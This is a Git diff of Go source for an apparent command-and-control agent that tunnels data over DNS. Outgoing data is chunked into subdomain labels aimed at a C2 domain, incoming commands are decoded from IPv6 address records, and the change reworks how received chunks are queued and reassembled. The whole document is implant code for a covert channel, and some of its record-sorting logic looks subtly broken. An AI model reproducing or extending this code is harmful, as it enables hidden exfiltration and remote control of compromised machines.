@@ -62,8 +62,8 @@ type Agent struct {
 	id       string
 	password string
 	crypto   Crypto
-	sendq    map[string]AgentCommand                    // map["010FF.chunk"] = 0xff
-	recvq    map[AgentCommand]map[string]map[int][]byte // map[0x01] = ["data_id"] = [0 = chunk1, 1 = chunk2]
+	sendq    map[string]AgentCommand   // map["010FF.chunk"] = 0xff
+	recvq    map[string]map[int][]byte // map[dataId] = [0 = chunk1, 1 = chunk2]
 	sentKey  bool
 	config   config.Config
 	shutdown bool
@@ -79,7 +79,7 @@ func (a *Agent) Init() {
 	a.crypto = Crypto{}
 
 	a.sendq = make(map[string]AgentCommand)
-	a.recvq = make(map[AgentCommand]map[string]map[int][]byte)
+	a.recvq = make(map[string]map[int][]byte)
 
 	a.NewAgentID()
 	a.NewKeys()
@@ -180,12 +180,8 @@ func (a *Agent) QueueData(command AgentCommand, bytes []byte) {
 	dataId := a.crypto.RandomHexString(DATA_ID_LEN)
 
 	for chunkNumber, chunkData := range chunks {
-		//log.Printf("chunk %d: %s\n", chunk_num, chunk_data)
-
-		// [agent_id].[command][chunk_num][chunk_total].[data_id].[chunk].c2
-		queueMessage := fmt.Sprintf("%s.%02x%02x%02x.%s.%s", a.id, command.Number(), chunkNumber, totalChunks, dataId, chunkData)
-		//log.Printf("q: %s\n", q)
-
+		// [agentId].[dataId][agent_command].[chunk_num][chunk_total].[chunk].c2.domain.tld
+		queueMessage := fmt.Sprintf("%s.%s%02x.%02x%02x.%s", a.id, dataId, command.Number(), chunkNumber, totalChunks, chunkData)
 		// TODO: need a better structure
 		a.sendq[queueMessage] = command
 	}
@@ -296,7 +292,7 @@ func (a *Agent) ProcessSendQ() {
 func (a *Agent) ProcessResponse(response []string) {
 	var err error
 	command := 0
-	totalRecords := 0
+	totalIps := 0
 	paddedBytesCount := 0
 	var dataId string
 
@@ -334,13 +330,8 @@ func (a *Agent) ProcessResponse(response []string) {
 			}
 
 			dataId = blocks[1]
-			if _, ok := a.recvq[AgentCommand(command)]; !ok {
-				a.recvq[AgentCommand(command)] = map[string]map[int][]byte{}
-			}
-			if _, ok2 := a.recvq[AgentCommand(command)][dataId]; !ok2 {
-				delete(a.recvq, AgentCommand(command)) // delete old command data
-				a.recvq[AgentCommand(command)] = map[string]map[int][]byte{}
-				a.recvq[AgentCommand(command)][dataId] = map[int][]byte{}
+			if _, ok := a.recvq[dataId]; !ok {
+				a.recvq[dataId] = map[int][]byte{}
 			}
 
 			paddedBytesCount, err = HexBytesToInt(blocks[2][2:4])
@@ -348,7 +339,7 @@ func (a *Agent) ProcessResponse(response []string) {
 				log.Printf("error decoding padded bytes count from c2 response: %q, (err: %q)\n", response[i], err)
 				return
 			}
-			totalRecords, err = HexBytesToInt(blocks[3])
+			totalIps, err = HexBytesToInt(blocks[3])
 			if err != nil {
 				log.Printf("error decoding total records from c2 response: %q, (err: %q)\n", response[i], err)
 				return
@@ -364,59 +355,60 @@ func (a *Agent) ProcessResponse(response []string) {
 	// remove the header
 	finalResponse := append(response[:headerIndex], response[headerIndex+1:]...)
 
-	for i := range finalResponse {
-		if len(finalResponse[i]) < 10 {
+	for ipNum := range finalResponse {
+		// this does not appear to be a valid data ipv6 address
+		if len(finalResponse[ipNum]) < 10 {
 			continue
 		}
-		ipv6 := net.ParseIP(finalResponse[i])
+		ipv6 := net.ParseIP(finalResponse[ipNum])
 		if ipv6 == nil {
-			log.Printf("error parsing ipv6 in c2 response: %q, invalid ip\n", finalResponse[i])
+			log.Printf("error parsing ipv6 in c2 response: %q, invalid ip\n", finalResponse[ipNum])
 			return
 		}
 		expandedIpv6 := ExpandIPv6(ipv6)
+
 		blocks := strings.Split(expandedIpv6, ":")
 
 		recordNumber, err := HexBytesToInt(blocks[1])
 		if err != nil {
-			log.Printf("error decoding record num from c2 response: %q, (err: %q)\n", finalResponse[i], err)
+			log.Printf("error decoding record num from c2 response: %q, (err: %q)\n", finalResponse[ipNum], err)
 			return
 		}
 		dataString := strings.Join(blocks[2:], "")
 		data, err := HexStringToBytes(dataString)
 		if err != nil {
-			log.Printf("error decoding data from c2 response: %q, (err: %q)\n", finalResponse[i], err)
+			log.Printf("error decoding data from c2 response: %q, (err: %q)\n", finalResponse[ipNum], err)
 			return
 		}
 
-		a.recvq[AgentCommand(command)][dataId][recordNumber] = data
+		a.recvq[dataId][recordNumber] = data
 
-		receivedRecords := len(a.recvq[AgentCommand(command)][dataId])
-		if receivedRecords == totalRecords {
+		receivedRecords := len(a.recvq[dataId])
+		if receivedRecords == totalIps {
 			a.ProcessRecvQ(AgentCommand(command), dataId, paddedBytesCount)
 		}
 		//log.Printf("r %d / %d\n", received_records, total_records)
 	}
 }
 
-func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_count int) {
-
-	sortedRecords := make([]int, len(a.recvq[command][data_id]))
-	for rec := range a.recvq[command][data_id] {
-		sortedRecords = append(sortedRecords, rec)
+func (a *Agent) ProcessRecvQ(command AgentCommand, dataId string, paddedBytesCount int) {
+	sortedRecords := make([]int, len(a.recvq[dataId]))
+	for recordNumber := range a.recvq[dataId] {
+		sortedRecords = append(sortedRecords, recordNumber)
 	}
 	sort.Ints(sortedRecords)
 
 	var data []byte
-	for recordNumber := range sortedRecords {
-		for i := range a.recvq[command][data_id][recordNumber] {
-			data = append(data, a.recvq[command][data_id][recordNumber][i])
+	for sortedRecordNumber := range sortedRecords {
+		for i := range a.recvq[dataId][sortedRecordNumber] {
+			data = append(data, a.recvq[dataId][sortedRecordNumber][i])
 		}
 	}
 
-	data = data[:len(data)-padded_bytes_count]
+	data = data[:len(data)-paddedBytesCount]
 
 	log.Printf("processed recv for command: %s: %x\n", AgentCommand_name[int32(command)], data)
-	delete(a.recvq, command)
+	delete(a.recvq, dataId)
 
 	// keyx commands are not encrypted
 	if command == AgentCommand_AGENT_KEYX {
